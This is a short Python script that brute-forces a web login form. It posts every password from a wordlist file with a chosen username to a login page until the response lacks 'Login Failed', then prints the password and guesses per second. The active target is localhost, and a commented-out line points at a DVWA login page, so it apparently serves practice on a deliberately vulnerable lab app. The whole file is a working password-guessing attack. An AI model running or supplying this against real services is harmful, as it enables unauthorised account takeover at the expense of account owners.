import requests
import time

#url = "http://192.168.1.14/dvwa/login.php"
url = "http://127.0.0.1:8000/login.html"

print("Enter the username: ")
username = input()
wordlist = "passwords.txt"
foo = open (wordlist, "r", encoding="koi8_u", errors='ignore')
t1 = time.time()
j=0
for i in foo.readlines():
    i = i.strip("\n")
    d = {'uname':username, 'pword':i, "Login":'submit'}
    send_d = requests.post(url, data=d)
    j=j+1
    if "Login Failed" in str(send_d.content):
        pass
    else:
        print("Password is: ", i)
        break
t2 = time.time()

t3=int(t2-t1)

if (t3==0):
    t3=1
speed = int(j/t3)

print("Time: ", t3)
print("Speed: ", speed)